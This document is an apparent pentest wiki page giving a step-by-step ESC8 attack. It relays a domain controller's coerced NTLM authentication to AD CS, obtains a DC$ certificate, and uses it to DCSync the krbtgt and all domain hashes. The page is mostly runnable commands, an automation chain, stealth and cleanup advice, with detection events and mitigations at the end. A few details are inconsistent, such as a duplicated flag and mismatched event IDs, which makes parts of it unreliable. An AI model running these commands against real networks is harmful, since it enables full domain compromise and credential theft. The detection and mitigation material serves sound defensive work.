# ADCS + PetitPotam NTLM Relay: Obtaining krbtgt Hash with Domain Controller Machine Certificate

## Overview

ESC8 exploits the AD CS Web Enrollment interface by relaying NTLM authentication from a coerced Domain Controller to obtain a **Domain Controller machine certificate**. This certificate can then be used for PKINIT authentication as the DC machine account (DC$), which has **DCSync privileges** — allowing the attacker to extract the krbtgt hash and all domain credentials.

### Attack Chain Summary

```
1. Start ntlmrelayx → HTTP relay to AD CS Web Enrollment
2. Start Responder (or SMB listener)
3. Coerce DC to authenticate to attacker (PetitPotam/Printer Bug)
4. DC's NTLM auth gets relayed to AD CS → DomainController certificate issued
5. Use PKINIT with the certificate → TGT as DC$
6. DCSync entire domain
```

### Why This Works

- The AD CS Web Enrollment endpoint (/certsrv/certfnsh.asp) accepts NTLM authentication
- Extended Protection for Authentication (EPA) is often not enforced on the CA
- NTLM relay is not mitigated because channel binding is missing
- PetitPotam forces a DC to authenticate to an attacker-controlled server via MS-EFSRPC
- The DomainController template is enabled and allows enrollment by domain computers
- A valid machine certificate allows PKINIT authentication as the machine account

## Pre-requisites

### Required Conditions

| Condition | Check Method |
|-----------|-------------|
| AD CS server with Web Enrollment enabled | Check for /certsrv/ endpoint |
| DomainController certificate template available | `certipy find` - look for DomainController template |
| CA allows NTLM authentication | Default configuration |
| Network access to CA HTTP endpoint (80/443) | `curl -I http://CA.domain.local/certsrv/` |
| Ability to coerce DC authentication | PetitPotam or Printer Bug |
| DC machine account has enrollment rights on DomainController template | Default configuration |

### Identify AD CS Server

```bash
# Using certipy to find CA servers
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout

# Look for:
#   Certificate Authorities
#     [!] Found 1 CA server(s)
#       CA-SERVER.domain.local
#
# Look in output for:
#   Template: DomainController
#     Enrollment Rights: Domain Computers
```

```powershell
# Using PowerShell to find CA
Get-ADObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties cn, dNSHostName |
    Select cn, dNSHostName
```

### Check CA Web Enrollment

```bash
# Check if Web Enrollment is available
curl -k -I https://CA-SERVER.domain.local/certsrv/

# Response should include 200 OK or 401 (NTLM challenge)
# If you get 404, Web Enrollment may not be installed
```

## Full Step-by-Step Attack

### Step 1: Start ntlmrelayx to AD CS HTTP Endpoint

```bash
# Basic relay to AD CS Web Enrollment
ntlmrelayx.py -t "http://CA-SERVER.domain.local/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController

# With specific IP binding
ntlmrelayx.py -t "http://CA-SERVER.domain.local/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController -smb2support --no-dump

# With output directory for certificates
ntlmrelayx.py -t "http://CA-SERVER.domain.local/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController --output-dir captured_certs
```

Parameters explained:

| Parameter | Purpose |
|-----------|---------|
| `-t URL` | Target HTTP endpoint (AD CS Web Enrollment) |
| `--smb2support` | Support SMB2 protocol for incoming connections |
| `--adcs` | Enable AD CS certificate relay mode |
| `--template DomainController` | Request the DomainController template |
| `--no-dump` | Prevent automatic dumping of relayed credentials |
| `--output-dir DIR` | Save issued certificates to directory |

### Step 2: Start Responder (Disable SMB Server)

Since ntlmrelayx will handle SMB, disable Responder's SMB server to avoid conflicts:

```bash
# Edit Responder.conf to disable SMB
# Set: SMB = Off
# Set: HTTP = Off (if ntlmrelayx handles HTTP)

# Start Responder
python3 Responder.py -I eth0 -v

# Or use a minimal SMB listener without Responder
# ntlmrelayx includes SMB server capability
```

### Step 3: Coerce the DC to Authenticate

#### Using PetitPotam

```bash
# PetitPotam usage: python3 PetitPotam.py attacker_IP DC_IP
python3 PetitPotam.py 192.168.1.100 192.168.1.10

# With specific pipe
python3 PetitPotam.py -pipe lsarpc 192.168.1.100 192.168.1.10

# Alternative syntax (some versions)
python3 PetitPotam.py -d domain.local -u user -p pass DC_IP ATTACKER_IP
```

#### Using Printer Bug (SpoolSample)

```bash
# printerbug.py from Impacket examples
python3 printerbug.py "domain.local/user:Password123!"@DC.domain.local attacker_ip

# With hashes
python3 printerbug.py -hashes :NTLM_HASH "domain.local/user"@DC.domain.local attacker_ip
```

#### Using Coercer

```bash
# Coercer can try multiple coercion methods
python3 coercer.py coerce -t DC.domain.local -l ATTACKER_IP -u 'user' -p 'Password123!'

# With specific protocol
python3 coercer.py coerce -t DC.domain.local -l ATTACKER_IP -u 'user' -p 'Password123!' -m "MS-EFSRPC"
```

### Step 4: ntlmrelayx Relays and Certificate Issued

When the coerced DC connects to your relay, ntlmrelayx will:

1. Receive the DC's NTLM authentication
2. Relay it to the AD CS Web Enrollment endpoint
3. Request a certificate using the DomainController template
4. The CA issues a certificate for the DC machine account

ntlmrelayx output:
```
[*] Protocol Client SMB.. loaded..
[*] Protocol Client HTTP.. loaded..
[*] Running against: http://CA-SERVER.domain.local/certsrv/certfnsh.asp

[*] SMBD-Thread-5 (process_request_thread): Connection from DC@DC.domain.local (192.168.1.10) controlled.
[*] SMBD-Thread-5 (process_request_thread): Got NTLM auth from DC$@domain.local (domain.local)
[*] SMBD-Thread-5 (process_request_thread): Relay authenticated!
[*] SMBD-Thread-5 (process_request_thread): Relaying to HTTP server...
[*] HTTP server returned: 200 OK
[*] Got certificate for domain.local\DC$ with template DomainController
[*] Writing certificate to: DC$.pfx
```

### Step 5: Obtain the Certificate

The certificate PFX is saved by ntlmrelayx:

```bash
# Default output filename: DC$.pfx or domain.local_DC$.pfx
ls -la *.pfx

# If --output-dir was used
ls captured_certs/
```

Convert the PFX to base64 for use with Rubeus:

```bash
# Base64 encode the PFX
base64 -w0 DC$.pfx > dc_cert.b64
cat dc_cert.b64
```

### Step 6: Authenticate as DC$ Using PKINIT

#### Using gettgtpkinit.py (Linux)

```bash
# Authenticate with PKINIT using the issued certificate
python3 gettgtpkinit.py "domain.local/DC$" -cert-pfx DC$.pfx -pfx-pass "" dc.ccache

# Note: The PFX password is usually empty (passed during relay)

# Export the ticket
export KRB5CCNAME=dc.ccache

# Verify the ticket
klist
```

#### Using Rubeus (Windows)

```cmd
# Method 1: Direct PFX file
Rubeus.exe asktgt /user:DC$ /certificate:DC$.pfx /password:"" /ptt

# Method 2: Base64-encoded certificate
Rubeus.exe asktgt /user:DC$ /certificate:BASE64 /password:"" /ptt

# Method 3: With /nowrap for clean output
Rubeus.exe asktgt /user:DC$ /certificate:DC$.pfx /password:"" /ptt /nowrap

# Verify the ticket
klist
```

#### Using Certipy

```bash
# Certipy can also authenticate with certificates
certipy auth -pfx DC$.pfx -dc-ip 192.168.1.10

# Or use the cert with PKINIT
certipy auth -pfx DC$.pfx -dc-ip 192.168.1.10 -username DC$ -domain domain.local
```

### Step 7: DCSync the Domain

Now authenticated as the DC machine account (DC$), you have replication rights to DCSync:

#### Using secretsdump (Linux)

```bash
# With the ccache ticket
export KRB5CCNAME=dc.ccache

# DCSync all hashes
python3 secretsdump.py -k -no-pass "domain.local/DC$@DC.domain.local"

# DCSync specific account (krbtgt)
python3 secretsdump.py -k -no-pass "domain.local/DC$@DC.domain.local" -just-dc-user krbtgt

# DCSync Administrator
python3 secretsdump.py -k -no-pass "domain.local/DC$@DC.domain.local" -just-dc-user Administrator

# DCSync all NTLM hashes
python3 secretsdump.py -k -no-pass "domain.local/DC$@DC.domain.local" -just-dc-ntlm
```

#### Using Mimikatz (Windows)

```cmd
# After /ptt with Rubeus
privilege::debug
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator
lsadump::dcsync /domain:domain.local /all /csv
```

#### Using Impacket wmiexec

```bash
# Execute commands on the DC using the TGT
export KRB5CCNAME=dc.ccache
python3 wmiexec.py -k -no-pass "domain.local/DC$@DC.domain.local"

# Once on the DC, dump credentials
```

### Step 8: Extract krbtgt Hash

The krbtgt hash enables forging golden tickets for persistence:

```bash
# Extract krbtgt hash from DCSync output
python3 secretsdump.py -k -no-pass "domain.local/DC$@DC.domain.local" -just-dc-user krbtgt

# Output example:
# domain.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:KRBTGT_NTLM_HASH:::
```

```mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt

# Output:
# ...
# Hash NTLM: KRBTGT_NTLM_HASH
# ...
```

## Alternative: Using Certipy for ESC8

Certipy provides an integrated relay-to-CA workflow:

```bash
# Certipy relay mode
certipy relay -ca CA-SERVER.domain.local -template DomainController

# This combines the relay and coercion in one command
# Certipy handles both the relay server and the coercion

# With specific template and output
certipy relay -ca CA-SERVER.domain.local -template DomainController -output-dir certs

# Certipy will:
# 1. Start the relay server
# 2. Wait for incoming connections
# 3. Relay to CA when connection received
# 4. Save issued certificate
```

## Alternative: Using Printer Bug Instead of PetitPotam

```bash
# Using printerbug.py with the relay
# Terminal 1: Start relay
ntlmrelayx.py -t "http://CA-SERVER/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController

# Terminal 2: Coerce with printer bug
python3 printerbug.py "domain.local/user:Password123!"@DC.domain.local ATTACKER_IP
```

## Complete Automation Script

### Bash One-Liner Chain

```bash
# Terminal 1: Start ntlmrelayx
ntlmrelayx.py -t "http://CA-SERVER.domain.local/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController --output-dir relayed_certs &

# Wait for relay to be ready
sleep 3

# Terminal 2: Trigger PetitPotam
python3 PetitPotam.py ATTACKER_IP DC_IP

# Wait for certificate
sleep 5

# Use the certificate
python3 gettgtpkinit.py "domain.local/DC$" -cert-pfx relayed_certs/DC\$.pfx -pfx-pass "" dc.ccache
export KRB5CCNAME=dc.ccache
python3 secretsdump.py -k -no-pass "domain.local/DC$@DC.domain.local" -just-dc-ntlm
```

## OPSEC Considerations

### Network Level

- NTLM relay over HTTP generates network traffic between DC and attacker
- PetitPotam uses MS-EFSRPC (port 445) — may be monitored
- The relay server must be reachable from both the DC and the CA
- Consider using HTTPS instead of HTTP to avoid plaintext NTLM capture by network monitors

### Certificate Issuance

- The DomainController template issuance is logged (Event ID 4886/4887)
- A new certificate for the DC may be flagged as suspicious
- Multiple certificate requests in short succession are anomalous
- The issued certificate is valid for 1 year by default (depends on template)

### Stealth

```bash
# Use HTTPS for the relay to blend in
ntlmrelayx.py -t "https://CA-SERVER.domain.local/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController

# Add delays between steps
sleep 10

# Clean up certificates after use
rm -f *.pfx *.ccache *.b64
```

### Cleanup

```bash
# Remove relayed certificates
rm -rf relayed_certs/

# Remove ccache files
rm -f *.ccache

# If the certificate was imported into Windows cert store (Rubeus):
certlm.msc → Personal → Certificates → Delete the imported cert
```

## Detection

### Event ID 5140 — File Share Access (Coercion)

When PetitPotam triggers the DC to connect:

```
A network share object was accessed.
  Share Name: \\*\IPC$
  Source Address: ATTACKER_IP
  Account Name: DC$@domain.local
```

### Event ID 4886 — Certificate Services issued a certificate

```
Certificate Services issued a certificate.
  Request ID: 1234
  Requester: DC$
  Certificate Template: DomainController
```

### Event ID 4887 — Certificate Services approved a certificate request

```
Certificate Services approved a certificate request and issued a certificate.
  Request ID: 1234
  Attributes: Certificate Template: DomainController
  Requester: domain.local\DC$
```

### Event ID 4769 — Kerberos Service Ticket Request (PKINIT)

When the attacker uses PKINIT:

```
A Kerberos service ticket was requested.
  Account Name: DC$@domain.local
  Service Name: krbtgt
  Ticket Encryption Type: 0x19 (PKINIT)
  Pre-Authentication Type: 16 (PKINIT certificate)
```

### Event ID 4662 — Directory Service Access (DCSync)

```
An operation was performed on an object.
  Object: DC=domain,DC=local
  Access: DS-Replication-Get-Changes
  Access Mask: 0x100
  Account: DC$@domain.local
```

### Detection Rules

```powershell
# Detect certificate issuance for DC accounts
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4886} |
    Where-Object { $_.Properties[3].Value -match "DomainController" }

# Detect PetitPotam via EFSRPC access
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=5140} |
    Where-Object { $_.Properties[1].Value -match "IPC" }

# Detect PKINIT auth as DC
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4768} |
    Where-Object { $_.Properties[10].Value -eq "0x19" -and
                   $_.Properties[1].Value -match "DC\$" }
```

## Mitigations

| Mitigation | Description | Impact |
|------------|-------------|--------|
| Enable EPA | Enable Extended Protection for Authentication on CA | Blocks NTLM relay |
| Disable NTLM on CA | Disable NTLM authentication for Web Enrollment | Blocks relay |
| Disable Web Enrollment | Remove certsrv Web Enrollment if not needed | Prevents ESC8 |
| Enable SMB Signing | Require SMB signing on all systems | Blocks NTLM relay |
| Protect DomainController Template | Restrict enrollment rights | Prevents unauthorized certs |
| Monitor CA Logs | Alert on certificate issuance for DC accounts | Detection |

### Enable EPA on AD CS

```powershell
# On the CA server, run as administrator:
# Enable Extended Protection for Authentication
certutil -setreg CA\InterfaceFlags +ENFORCE_EPA

# Restart CA service
net stop certsvc && net start certsvc
```

### Disable NTLM for Web Enrollment

```
IIS Manager → Default Web Site → CertSrv → Authentication
→ Windows Authentication → Providers
→ Remove NTLM (keep only Kerberos)
```

### Disable Web Enrollment

```powershell
# Remove Web Enrollment role service
Uninstall-WindowsFeature ADCS-Web-Enrollment
```

## Pre-requisites Checking Script

```bash
#!/bin/bash
# precheck.sh — Check if ESC8 is viable

TARGET_DC=$1
CA_SERVER=$2
ATTACKER_IP=$3

echo "[*] Checking AD CS Web Enrollment..."
curl -k -v "https://${CA_SERVER}/certsrv/" 2>&1 | grep -i "401\|200\|NTLM"

echo "[*] Checking DC connectivity..."
ping -c 1 ${TARGET_DC}

echo "[*] Checking CA connectivity..."
ping -c 1 ${CA_SERVER}

echo "[*] Testing SMB connectivity..."
smbclient -L //${TARGET_DC}/ -N 2>&1 | head -5

echo "[*] Checking if DomainController template exists..."
certipy find -u '' -p '' -dc-ip ${TARGET_DC} -stdout 2>/dev/null | grep -i "DomainController" || echo "Need credentials for certipy find"

echo "[*] Done. If all checks pass, ESC8 should work."
```

## Cross-References

- [ADCS Enumeration with Certipy](./01_Certipy_Enumeration.md)
- [ESC7 / ESC8 — CA ACL Abuse & NTLM Relay](./04_ESC7_ESC8.md)
- [Shadow Credentials](../08_Persistence/10_Shadow_Credentials.md)
- [Pass the Hash with Machine Accounts](../04_Lateral_Movement/12_Pass_The_Hash_Machine_Accounts.md)
- [DC Print Server + Kerberos Delegation](../11_Attack_Scenarios/04_DC_Print_Server_Kerberos_Delegation.md)
- [Tools Reference - Impacket](../09_Tools_Reference/README.md)
- [Tools Reference - Certipy](../09_Tools_Reference/README.md)
- [Tools Reference - Rubeus](../09_Tools_Reference/README.md)
